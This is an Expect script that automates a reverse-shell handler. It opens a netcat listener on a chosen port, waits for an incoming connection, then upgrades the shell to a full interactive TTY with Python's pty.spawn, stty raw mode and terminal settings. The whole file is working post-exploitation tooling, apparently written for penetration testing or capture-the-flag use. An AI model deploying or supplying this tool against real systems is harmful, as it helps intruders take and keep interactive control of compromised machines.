#!/usr/bin/expect

lassign $argv arg1 arg2 arg3

log_user 0
set timeout -1

spawn /bin/bash
send "nc -lvp $arg1\n"
expect "Connection from"
send "python -c \'import pty; pty.spawn(\"/bin/bash\")\'\n"
sleep 0.5
send \x1A
send "stty raw -echo\n"
send "fg\n"
send "reset\n"
send "export SHELL=bash\n"
send "export TERM=xterm-256color\n"
send "stty rows `tput lines` columns `tput cols`\n"
send "clear\n"
interact
send "stty -raw echo\n"
send "exit\n"
exit

